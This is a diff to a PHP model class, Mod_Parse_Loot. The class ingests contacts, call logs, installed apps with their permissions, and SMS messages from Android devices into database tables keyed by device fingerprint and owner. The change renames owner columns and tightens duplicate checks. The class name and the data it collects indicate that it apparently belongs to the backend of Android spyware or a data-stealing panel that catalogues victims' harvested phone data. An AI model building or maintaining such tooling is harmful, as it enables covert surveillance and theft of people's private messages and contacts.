@@ -62,7 +62,7 @@ class Mod_Parse_Loot extends Model
                     'contact_frequency'  => $contact['times_contacted'] ?? 0,
                     'device_id'          => $var_file_print, // Using print as device fingerprint
                     'extracted_at'       => $extracted_at,
-                    'meta_Owner'         => $var_file_owner,
+                    'owner_id'           => $var_file_owner,
                     'is_synced'          => 0,
                     'sync_count'         => 0,
                     'is_active'          => 1,
@@ -74,7 +74,7 @@ class Mod_Parse_Loot extends Model
                 $exists = $this->db->table('tbl_contacts')
                         ->where('contact_id', $data['contact_id'])
                         ->where('device_id', $data['device_id'])
-                        ->where('meta_Owner', $data['meta_Owner'])
+                        ->where('owner_id', $data['owner_id'])
                         ->countAllResults() > 0;
 
                 if (!$exists) {
@@ -145,7 +145,7 @@ class Mod_Parse_Loot extends Model
                     'formatted_duration' => $log['formatted_duration'] ?? '',
                     'device_id'          => $var_file_print,
                     'extracted_at'       => $extracted_at ? date('Y-m-d H:i:s', substr($extracted_at, 0, -3)) : null,
-                    'meta_Owner'         => $var_file_owner,
+                    'owner_id'           => $var_file_owner,
                     'is_active'          => 1,
                     'created_at'         => $dated,
                     'updated_at'         => $dated,
@@ -156,7 +156,7 @@ class Mod_Parse_Loot extends Model
                         ->where('phone_number', $logData['phone_number'])
                         ->where('call_date', $logData['call_date'])
                         ->where('duration_seconds', $logData['duration_seconds'])
-                        ->where('meta_Owner', $logData['meta_Owner'])
+                        ->where('owner_id', $logData['owner_id'])
                         ->countAllResults() > 0;
 
                 if (!$exists) {
@@ -234,20 +234,20 @@ class Mod_Parse_Loot extends Model
                     'permissions'        => !empty($app['permissions']) ? json_encode($app['permissions']) : null,
                     'permission_count'   => $app['permission_count'] ?? 0,
                     'app_size'           => $app['app_size'] ?? 0,
+                    'owner_id'           => $var_file_owner,
                     'device_id'          => $device_id,
                     'device_model'       => $device_model,
                     'android_version'    => $android_version,
-                    'meta_owner'         => $var_file_owner,
                     'extracted_at'       => $extracted_at,
-                    'meta_print'         => $var_file_print,
                     'created_at'         => $dated,
                     'updated_at'         => $dated,
                 ];
 
-                // Duplicate check: same package on same device
+                // Duplicate check: same package on same device for same user
                 $exists = $this->db->table('tbl_apps')
                         ->where('package_name', $data['package_name'])
                         ->where('device_id', $data['device_id'])
+                        ->where('owner_id', $data['owner_id'])
                         ->countAllResults() > 0;
 
                 if (!$exists) {
@@ -392,7 +392,7 @@ class Mod_Parse_Loot extends Model
                     'creator'            => $sms['creator'] ?? null,
 
                     // Metadata
-                    'meta_owner'         => $var_file_owner,
+                    'owner_id'           => $var_file_owner,
                     'device_id'          => $var_file_print,
                     'extracted_at'       => $extracted_at,
 
@@ -407,7 +407,7 @@ class Mod_Parse_Loot extends Model
                 $exists = $this->db->table('tbl_sms')
                         ->where('android_sms_id', $smsData['android_sms_id'])
                         ->where('device_id', $smsData['device_id'])
-                        ->where('meta_owner', $smsData['meta_owner'])
+                        ->where('owner_id', $smsData['owner_id'])
                         ->countAllResults() > 0;
 
                 if (!$exists) {
